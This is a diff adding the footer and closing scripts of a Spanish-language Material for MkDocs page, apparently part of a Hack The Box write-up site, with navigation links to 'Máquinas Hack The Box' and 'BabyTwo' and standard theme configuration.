+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver al principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Pie" >
+        
+          
+          <a href="../" class="md-footer__link md-footer__link--prev" aria-label="Anterior: Máquinas Hack The Box">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Anterior
+              </span>
+              <div class="md-ellipsis">
+                Máquinas Hack The Box
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../babytwo/" class="md-footer__link md-footer__link--next" aria-label="Siguiente: BabyTwo">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Siguiente
+              </span>
+              <div class="md-ellipsis">
+                BabyTwo
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.indexes", "navigation.top", "navigation.instant", "navigation.footer", "search.suggest", "search.highlight", "content.code.copy", "toc.follow"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
